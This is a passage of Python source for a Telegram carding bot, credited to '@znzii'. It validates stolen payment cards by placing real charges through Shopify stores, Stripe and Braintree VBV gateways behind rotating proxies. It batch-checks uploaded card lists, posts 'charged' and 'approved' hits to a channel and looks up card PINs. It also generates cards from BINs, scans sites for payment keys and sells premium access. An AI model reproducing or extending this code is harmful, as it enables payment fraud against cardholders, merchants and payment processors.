        filter_text += f"   ┣ {f['name']}  {count}\n"
    
    welcome_text = f"""━━━━━━━━━━━━━━━━━━
▸ 👋 Hᴇʏ  · @{username}
▸ ᴘʟɴ  · {plan}
▸ Sʜᴏᴘɪғʏ
━━━━━━━━━━━━━━━━━
<code>/cc</code> · <code>/chk</code> · <code>/redeem</code>
━━━━━━━━━━━━━━━━━
One day I will be the best 
💡 Bᴏᴛ Dᴇᴠ @znzii
 Vᴇʀsɪᴏɴ -»3.0 🚀
━━━━━━━━━━━━━━━━━"""
    
    buttons = get_main_menu_keyboard(user_id)
    try:
        await event.reply(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')
    except errors.FloodWaitError as e:
        await asyncio.sleep(e.seconds)

@bot.on(events.CallbackQuery(data=b"show_cmds"))
async def show_commands_callback(event):
    commands_text = """📋 Usᴇʀ Cᴏᴍᴍᴀɴᴅs

🛍️ Sʜᴏᴘɪғʏ
├─ <code>/cc ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
└─ <code>/chk</code> → Mᴀss ᴄʜᴇᴄᴋ ғʀᴏᴍ .ᴛxᴛ ғɪʟᴇ

👑 Sᴛʀɪᴘᴇ Cʜᴀʀɢᴇ (1$)
├─ <code>/st ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
└─ <code>/ran_st</code> → Bᴀᴛᴄʜ ᴄʜᴇᴄᴋ (reply .txt)

🪪 Vʙᴠ Bʀᴀɪɴᴛʀᴇᴇ (4$)
├─ <code>/vbv ᴄᴄ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴄᴀʀᴅ
└─ <code>/ran_vbv</code> → Bᴀᴛᴄʜ ᴄʜᴇᴄᴋ (reply .txt)

🔑 Kᴇʏ Sʏsᴛᴇᴍ
└─ <code>/redeem Kᴇʏ</code> → Rᴇᴅᴇᴇᴍ ᴀ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏ """
    buttons = [[Button.inline(" Bᴀᴄᴋ", b"main_menu", style="danger", icon=5445365692004071819)]]
    await event.edit(premium_emoji(commands_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_callback(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.answer("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ.", alert=True)
        return
    admin_text = """👑 <b>Aᴅᴍɪɴ Pᴀɴᴇʟ</b>

📋 <b>Pʀᴇᴍɪᴜᴍ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/addpremium ᴜsᴇʀ_ɪᴅ</code> → Aᴅᴅ ᴜsᴇʀ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/removepremium ᴜsᴇʀ_ɪᴅ</code> → Rᴇᴍᴏᴠᴇ ᴜsᴇʀ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ
├─ <code>/listpremium</code> → Lɪsᴛ ᴀʟʟ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs
└─ <code>/genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ᴜsᴇʀ_ʟɪᴍɪᴛ</code> → Gᴇɴᴇʀᴀᴛᴇ ᴘʀᴇᴍɪᴜᴍ ᴋᴇʏs

🌐 <b>Sɪᴛᴇs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/addsites</code> → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sʜᴏᴘɪғʏ sɪᴛᴇs
├─ <code>/addstripe</code> → Rᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ғɪʟᴇ ᴛᴏ ᴜᴘʟᴏᴀᴅ sᴛʀɪᴘᴇ sɪᴛᴇs
├─ <code>/mysites</code> → Lɪsᴛ ᴀʟʟ sɪᴛᴇs
├─ <code>/rmsite</code> → Rᴇᴍᴏᴠᴇ sᴛʀɪᴘᴇ sɪᴛᴇ
├─ <code>/site</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ sɪᴛᴇs
├─ <code>/rm ᴜʀʟ</code> → Rᴇᴍᴏᴠᴇ sᴘᴇᴄɪғɪᴄ sɪᴛᴇ
├─ <code>/getsites</code> → Dᴏᴡɴʟᴏᴀᴅ ᴄᴜʀʀᴇɴᴛ sɪᴛᴇs.ᴛxᴛ
├─ <code>/setfilter shopify_global ᴍɪɴ-ᴍᴀx \"Nᴀᴍᴇ\"</code> → Aᴅᴅ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ
├─ <code>/listfilters</code> → Vɪᴇᴡ ᴀʟʟ ғɪʟᴛᴇʀs
└─ <code>/removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ</code> → Rᴇᴍᴏᴠᴇ ᴀ ғɪʟᴛᴇʀ

🔌 Pʀᴏxʏ Mᴀɴᴀɢᴇᴍᴇɴᴛ
├─ <code>/proxy</code> → Cʜᴇᴄᴋ & ʀᴇᴍᴏᴠᴇ ᴅᴇᴀᴅ ᴘʀᴏxɪᴇs
├─ <code>/addproxy</code> → Aᴅᴅ ᴘʀᴏxɪᴇs
├─ <code>/chkproxy ᴘʀᴏxʏ</code> → Cʜᴇᴄᴋ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ <code>/rmproxy ᴘʀᴏxʏ</code> → Rᴇᴍᴏᴠᴇ sɪɴɢʟᴇ ᴘʀᴏxʏ
├─ <code>/rmproxyindex 1,2,3</code> → Rᴇᴍᴏᴠᴇ ʙʏ ɪɴᴅᴇx
├─ <code>/clearproxy</code> → Rᴇᴍᴏᴠᴇ ᴀʟʟ ᴘʀᴏxɪᴇs
└─ <code>/getproxy</code> → Gᴇᴛ ᴀʟʟ ᴘʀᴏxɪᴇs

📊 <b>Bᴏᴛ Sᴛᴀᴛɪsᴛɪᴄs</b>
└─ <code>/stats</code> → Sʜᴏᴡ ʙᴏᴛ sᴛᴀᴛɪsᴛɪᴄs

🔧 <b>Hɪᴛs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/sethits ᴄʜᴀɴɴᴇʟ_ɪᴅ</code> → Sᴇᴛ ʜɪᴛs ᴄʜᴀɴɴᴇʟ
└─ <code>/hits</code> → Tᴏɢɢʟᴇ ʜɪᴛs ᴏɴ/ᴏғғ"""
    buttons = [[Button.inline(" Bᴀᴄᴋ", b"main_menu", style="danger", icon=5445365692004071819)]]
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    is_prem = is_premium(user_id)
    plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"
    
    sites_data = await load_sites_with_price()
    total_sites = len(sites_data)
    
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    
    filter_text = ""
    for f in gateway_filters:
        if f.get('all', False):
            count = total_sites
        else:
            count = len([s for s in sites_data if f['min'] <= s.get('price', 0) < f['max']])
        filter_text += f"   ┣ {f['name']}  {count}\n"
    
    welcome_text = f"""━━━━━━━━━━━━━━━━━━
▸ 👋 Hᴇʏ  · @{username}
▸ ᴘʟɴ  · {plan}
▸ Sʜᴏᴘɪғʏ
━━━━━━━━━━━━━━━━━
<code>/cc</code> · <code>/chk</code> · <code>/redeem</code>
━━━━━━━━━━━━━━━━━
One day I will be the best 
💡 Bᴏᴛ Dᴇᴠ @znzii
 Vᴇʀsɪᴏɴ -»3.0 🚀
━━━━━━━━━━━━━━━━━"""
    
    buttons = get_main_menu_keyboard(user_id)
    await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"tools_menu"))
async def tools_menu_callback(event):
    user_id = event.sender_id
    
    tools_text = """🛠️ <b>Tᴏᴏʟs Mᴇɴᴜ • Pᴀɢᴇ 1/3</b>

📂 <b>Fɪʟᴇ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/split</code> → Sᴘʟɪᴛ ᴄᴀʀᴅs ɪɴᴛᴏ ᴘᴀʀᴛs
│    <code>/split 500</code> (ʀᴇᴘʟʏ ᴛᴏ ғɪʟᴇ)
├─ <code>/merge</code> → Mᴇʀɢᴇ ᴍᴜʟᴛɪᴘʟᴇ ғɪʟᴇs
│    <code>/merge</code> (ʀᴇᴘʟʏ ᴛᴏ ғɪʟᴇs)
├─ <code>/collect</code> → Cᴏʟʟᴇᴄᴛ ᴄᴀʀᴅs ғʀᴏᴍ ᴍᴇssᴀɢᴇs
│    <code>/collect</code> (ᴛʜᴇɴ sᴇɴᴅ ᴄᴀʀᴅs)
└─ <code>/clean</code> → Cʟᴇᴀɴ ᴄᴀʀᴅs (ʀᴇᴍᴏᴠᴇ ᴇxᴘɪʀᴇᴅ)
     <code>/clean</code> (ʀᴇᴘʟʏ ᴛᴏ ғɪʟᴇ)"""

    buttons = [
        [Button.inline("Pᴀɢᴇ 2", b"tools_menu_page2", style="primary", icon=5445350109862720603)]
    ]
    
    await event.edit(premium_emoji(tools_text), buttons=buttons, parse_mode='html')


@bot.on(events.CallbackQuery(data=b"tools_menu_page2"))
async def tools_menu_page2_callback(event):
    user_id = event.sender_id
    
    tools_text = """🛠️ <b>Tᴏᴏʟs Mᴇɴᴜ • Pᴀɢᴇ 2/3</b>

🔍 <b>Lᴏᴏᴋᴜᴘ </b>
├─ <code>/bin</code> → BIN ɪɴғᴏʀᴍᴀᴛɪᴏɴ
│    <code>/bin 415920</code>
│    <code>/bin 544422</code>
├─ <code>/sk</code> → Sᴛʀɪᴘᴇ Kᴇʏ Cʜᴇᴄᴋ
│    <code>/sk pk_live_xxxxxxxxxxxx</code>
│    <code>/sk pk_test_xxxxxxxxxxxx</code>
⚡ <b>Gᴇɴᴇʀᴀᴛᴏʀ</b>
└─ <code>/gen</code> → Gᴇɴᴇʀᴀᴛᴇ ᴄᴀʀᴅs
     <code>/gen 415920 10</code>
     <code>/gen 415920|12|2028|123 5</code>"""

    buttons = [
        [Button.inline("Pᴀɢᴇ 1", b"tools_menu", style="primary", icon=5445408306669582934),
         Button.inline("Pᴀɢᴇ 3", b"tools_menu_page3", style="primary", icon=5445350109862720603)]
    ]
    
    await event.edit(premium_emoji(tools_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"tools_menu_page3"))
async def tools_menu_page3_callback(event):
    user_id = event.sender_id
    
    tools_text = """🛠️ <b>Tᴏᴏʟs Mᴇɴᴜ • Pᴀɢᴇ 3/3</b>

🌐 <b>IP & Dᴀᴛᴀ Tᴏᴏʟs</b>

├─ <code>/ip</code> → IP Lᴏᴏᴋᴜᴘ & Iɴғᴏʀᴍᴀᴛɪᴏɴ
│   <code>/ip 8.8.8.8</code>
│   <code>/ip 192.168.1.1</code>
├─ <code>/fake</code> → Gᴇɴᴇʀᴀᴛᴇ Fᴀᴋᴇ Dᴀᴛᴀ
│    <code>/fake us</code>
│    <code>/fake eg</code>
│    <code>/fake fr</code>
├─ <code>/scg</code> → Sᴄᴀɴ sɪᴛᴇ ғᴏʀ ɢᴀᴛᴇᴡᴀʏs & ᴋᴇʏs
│    <code>/scg https://example.com</code>
│    <code>/scg example.com</code>
└─ <code>/iban</code> → IBAN Vᴀʟɪᴅᴀᴛᴏʀ & Iɴғᴏ
     <code>/iban GB82WEST12345698765432</code>
     <code>/iban DE89370400440532013000</code>"""

    buttons = [
        [Button.inline("Pᴀɢᴇ 2", b"tools_menu_page2", style="primary", icon=5445408306669582934)],
        [Button.inline("Bᴀᴄᴋ", b"main_menu", style="danger", icon=5445365692004071819)]
    ]
    
    await event.edit(premium_emoji(tools_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=rb"price_fltr:(\d+):(\d+)"))
async def price_filter_callback(event):
    match = event.pattern_match
    filter_index = int(match.group(1).decode())
    user_id = int(match.group(2).decode())
    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return
    if user_id not in TEMP_FILE_DATA:
        await event.edit(premium_emoji("❌ Fɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
        return
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    if filter_index >= len(gateway_filters):
        await event.answer("❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ!", alert=True)
        return
    selected_filter = gateway_filters[filter_index]
    file_data = TEMP_FILE_DATA.pop(user_id)
    cards = file_data['cards']
    file_path = file_data['file_path']
    if os.path.exists(file_path):
        try:
            os.remove(file_path)
        except:
            pass
    sites_data = await load_sites_with_price()
    if not sites_data:
        await event.edit(premium_emoji("❌ Nᴏ sɪᴛᴇs ғᴏᴜɴᴅ ᴡɪᴛʜ ᴘʀɪᴄᴇs! Rᴜɴ /sɪᴛᴇ ғɪʀsᴛ."), parse_mode='html')
        return
    if not selected_filter.get('all', False):
        filtered_sites = []
        for s in sites_data:
            price = s.get('price', 0)
            if selected_filter['min'] <= price < selected_filter['max']:
                filtered_sites.append(s['url'])
        sites_to_use = filtered_sites
    else:
        sites_to_use = [s['url'] for s in sites_data]
    if not sites_to_use:
        await event.edit(premium_emoji(f"❌ Nᴏ sɪᴛᴇs ғᴏᴜɴᴅ ɪɴ ʀᴀɴɢᴇ {selected_filter['name']}!"), parse_mode='html')
        return
    await event.edit(premium_emoji(f"🚀 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ᴡɪᴛʜ ғɪʟᴛᴇʀ: {selected_filter['name']}\n\n📊 Sɪᴛᴇs: {len(sites_to_use)}\n💳 Cᴀʀᴅs: {len(cards)}"), parse_mode='html')
    await start_mass_check(user_id, cards, sites_to_use, event)
    await event.answer(f"✅ Sᴛᴀʀᴛᴇᴅ ᴄʜᴇᴄᴋ ᴡɪᴛʜ {len(sites_to_use)} sɪᴛᴇs!", alert=False)

@bot.on(events.CallbackQuery(data=b"cancel_filter"))
async def cancel_filter_callback(event):
    user_id = event.sender_id
    if user_id in TEMP_FILE_DATA:
        file_data = TEMP_FILE_DATA.pop(user_id)
        if os.path.exists(file_data['file_path']):
            try:
                os.remove(file_data['file_path'])
            except:
                pass
    await event.edit(premium_emoji("❌ Cᴀɴᴄᴇʟʟᴇᴅ."), parse_mode='html')
    await event.answer("✅ Cᴀɴᴄᴇʟʟᴇᴅ", alert=True)

@bot.on(events.NewMessage(pattern=r'/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ."), parse_mode='html')
        return
    # Check stars - need at least 1 star to use bot
    stars = get_stars(user_id)
    if stars <= 0:
        await event.reply(premium_emoji(f"❌ Nᴏᴛ ᴇɴᴏᴜɢʜ sᴛᴀʀs!\n\n⭐ Yᴏᴜ ʜᴀᴠᴇ: {stars} stars\n📅 <i>Daily bonus: {DAILY_STARS} stars</i>\n\n💡 <i>Wait for daily bonus or contact admin</i>"), parse_mode='html')
        return
    sites = load_sites()
    proxies = get_user_proxies(user_id)
    if not proxies:
        await event.reply(premium_emoji("❌  Nᴏ ᴘʀᴏxɪᴇs!\n\nᴜsᴇ /ᴀᴅᴅᴍʏᴘʀᴏxʏ"), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴀᴠᴀɪʟᴀʙʟᴇ!\n\n⚠️ Pʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ ᴛᴏ ᴀᴅᴅ ᴘʀᴏxɪᴇsᴇ."), parse_mode='html')
        return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ CC ғᴏʀᴍᴀᴛ. Usᴇ: <code>/cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code>"), parse_mode='html')
        return
    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ <code>{card}</code>..."), parse_mode='html')
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=999)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':
            status_header = premium_emoji('💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥')
        elif result['status'] == 'Approved':
            status_header = premium_emoji('✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅')
        else:
            status_header = premium_emoji('❌ DECLINED')
        final_resp = f"""{status_header}

💳 CC <code>{result['card']}</code>

🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}

🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}

💡 Mᴀᴅᴇ ʙʏ @znzii"""
        if 'Charged' in status_header or 'APPROVED' in status_header:
            await send_hit_to_channel(result['card'], result['status'], result['message'], result.get('gateway', 'Unknown'), result.get('price', '-'))
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

# ===================== STRIPE CHARGE COMMAND =====================
@bot.on(events.NewMessage(pattern=r'/st\s+'))
async def stripe_charge_single(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs."), parse_mode='html')
        return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Usage: /st card|mm|yy|cvv"), parse_mode='html')
        return
    card = cards[0]
    proxies = get_user_proxies(user_id)
    proxy = random.choice(proxies) if proxies else None
    status_msg = await event.reply(premium_emoji(f"👑 Checking Stripe Charge...\n<code>{card}</code>\n💰 Price: 1$"), parse_mode='html')
    try:
        result = await check_card_stripe_charge(card, proxy)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':
            status_header = premium_emoji('💎 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥')
        elif result['status'] == 'Approved':
            status_header = premium_emoji('✅ 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅')
        else:
            status_header = premium_emoji('❌ DECLINED')
        pin_text = f"\n🔐 PIN: <code>{result['pin']}</code>" if result.get('pin') else ""
        final_resp = f"""{status_header}\n\n💳 CC <code>{result['card']}</code>\n\n👑 Gateway: Stripe Charge\n📝 Response: {result['message'][:150]}\n💰 Price: {result.get('price', '1$')}{pin_text}\n\n🆔 BIN: {brand} - {bin_type} - {level}\n🏦 Bank: {bank}\n🥰 Country: {country} {flag}"""
        if result['status'] in ['Charged', 'Approved']:
            await send_hit_to_channel(result['card'], result['status'], result['message'], 'Stripe Charge', result.get('price', '1$'))
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ===================== VBV COMMAND =====================
@bot.on(events.NewMessage(pattern=r'/vbv\s+'))
async def vbv_single(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs."), parse_mode='html')
        return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Usage: /vbv card|mm|yy|cvv"), parse_mode='html')
        return
    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"🪪 Checking VBV Braintree...\n<code>{card}</code>\n💰 Price: 4$"), parse_mode='html')
    try:
        result = await check_card_vbv(card)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == '3DS':
            status_header = premium_emoji('✅ 3DS SUCCESS')
        else:
            status_header = premium_emoji('❌ DECLINED')
        pin_text = f"\n🔐 PIN: <code>{result['pin']}</code>" if result.get('pin') else ""
        final_resp = f"""{status_header}\n\n💳 CC <code>{result['card']}</code>\n\n🪪 Gateway: VBV Braintree\n📝 Response: {result['message'][:150]}\n💰 Price: {result.get('price', '4$')}{pin_text}\n\n🆔 BIN: {brand} - {bin_type} - {level}\n🏦 Bank: {bank}\n🥰 Country: {country} {flag}"""
        if result['status'] == '3DS':
            await send_hit_to_channel(result['card'], '3DS', result['message'], 'VBV Braintree', '4$')
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ===================== BATCH STRIPE CHARGE =====================
@bot.on(events.NewMessage(pattern=r'/ran_st$'))
async def batch_stripe_charge(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ"), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file with cards\n\n📝 Usage: /ran_st (reply to .txt)"), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')
        return
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    os.remove(file_path)
    if not cards:
        await event.reply(premium_emoji("❌ No valid cards found"), parse_mode='html')
        return
    proxies = get_user_proxies(user_id)
    status_msg = await event.reply(premium_emoji(f"👑 FAST Random Check (Stripe Charge)!\n📊 Total: {len(cards)}\n⚡ Speed: 10 simultaneously\n💰 Price: 1$"), parse_mode='html')
    results = {'charged': [], 'approved': [], 'dead': []}
    try:
        batch_size = 10
        for batch_start in range(0, len(cards), batch_size):
            batch_cards = cards[batch_start:batch_start + batch_size]
            tasks = [check_card_stripe_charge(c, random.choice(proxies) if proxies else None) for c in batch_cards]
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in batch_results:
                if isinstance(r, Exception):
                    continue
                if r['status'] == 'Charged':
                    results['charged'].append(r)
                    await send_hit_to_channel(r['card'], 'Charged', r['message'], 'Stripe Charge', r.get('price', '1$'))
                elif r['status'] == 'Approved':
                    results['approved'].append(r)
                    await send_hit_to_channel(r['card'], 'Approved', r['message'], 'Stripe Charge', r.get('price', '1$'))
                else:
                    results['dead'].append(r)
            checked = len(results['charged']) + len(results['approved']) + len(results['dead'])
            await status_msg.edit(premium_emoji(f"👑 Stripe Charge Progress\n✅ Checked: {checked}/{len(cards)}\n💎 Charged: {len(results['charged'])}\n🔥 Live: {len(results['approved'])}\n❌ Dead: {len(results['dead'])}"), parse_mode='html')
        final = f"""✅ Check Complete!\n\n📊 Total: {len(cards)}\n💎 Charged: {len(results['charged'])}\n🔥 Live: {len(results['approved'])}\n❌ Dead: {len(results['dead'])}"""
        await status_msg.edit(premium_emoji(final), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ===================== BATCH VBV =====================
@bot.on(events.NewMessage(pattern=r'/ran_vbv$'))
async def batch_vbv(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ"), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file with cards\n\n📝 Usage: /ran_vbv (reply to .txt)"), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')
        return
    file_path = await reply_msg.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    cards = extract_cc(content)
    os.remove(file_path)
    if not cards:
        await event.reply(premium_emoji("❌ No valid cards found"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🪪 FAST Random Check (VBV Braintree)!\n📊 Total: {len(cards)}\n⚡ Speed: 10 simultaneously\n💰 Price: 4$"), parse_mode='html')
    results = {'approved': [], 'dead': []}
    try:
        batch_size = 10
        for batch_start in range(0, len(cards), batch_size):
            batch_cards = cards[batch_start:batch_start + batch_size]
            tasks = [check_card_vbv(c) for c in batch_cards]
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in batch_results:
                if isinstance(r, Exception):
                    continue
                if r['status'] == '3DS':
                    results['approved'].append(r)
                    await send_hit_to_channel(r['card'], '3DS', r['message'], 'VBV Braintree', '4$')
                else:
                    results['dead'].append(r)
            checked = len(results['approved']) + len(results['dead'])
            await status_msg.edit(premium_emoji(f"🪪 VBV Progress\n✅ Checked: {checked}/{len(cards)}\n✅ 3DS: {len(results['approved'])}\n❌ Dead: {len(results['dead'])}"), parse_mode='html')
        final = f"""✅ Check Complete!\n\n📊 Total: {len(cards)}\n✅ 3DS: {len(results['approved'])}\n❌ Dead: {len(results['dead'])}"""
        await status_msg.edit(premium_emoji(final), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')

# ===================== PIN COMMAND =====================
@bot.on(events.NewMessage(pattern=r'/pin\s+'))
async def pin_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ"), parse_mode='html')
        return
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        await event.reply(premium_emoji("❌ Usage: /pin <card_number>"), parse_mode='html')
        return
    card_number = args[1].strip().split('|')[0]
    pin = await get_pin_for_card(card_number)
    if pin:
        await event.reply(premium_emoji(f"🔑 PIN Found!\n\n💳 Card: <code>{card_number}</code>\n🔐 PIN: <code>{pin}</code>"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ No PIN found for <code>{card_number}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ."), parse_mode='html')
        return
    await process_file_with_filters(event, user_id)

@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌  Admin only!"), parse_mode='html')
        return
    
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/addproxy</code> ғᴏʟʟᴏᴡᴇᴅ ʙʏ ᴘʀᴏxɪᴇs, ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ."), parse_mode='html')
            return
        
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴘʀᴏᴠɪᴅᴇᴅ."), parse_mode='html')
            return
        
        status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ {len(proxies_to_add)} ᴘʀᴏxɪᴇs ʙᴇғᴏʀᴇ ᴀᴅᴅɪɴɢ..."), parse_mode='html')
        
        current_proxies = load_proxies()
        alive_proxies = []
        dead_proxies = []
        already_exists = []
        
        for i, proxy in enumerate(proxies_to_add, 1):
            if proxy in current_proxies:
                already_exists.append(proxy)
                continue
            
            await status_msg.edit(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ [{i}/{len(proxies_to_add)}]: <code>{proxy[:30]}...</code>"), parse_mode='html')
            
            result = await test_proxy(proxy)
            
            if result['status'] == 'alive':
                alive_proxies.append(proxy)
                await status_msg.edit(premium_emoji(f"✅ Aʟɪᴠᴇ: <code>{proxy[:30]}...</code>\n\n📊 Aʟɪᴠᴇ: {len(alive_proxies)} | Dᴇᴀᴅ: {len(dead_proxies)}"), parse_mode='html')
            else:
                dead_proxies.append(proxy)
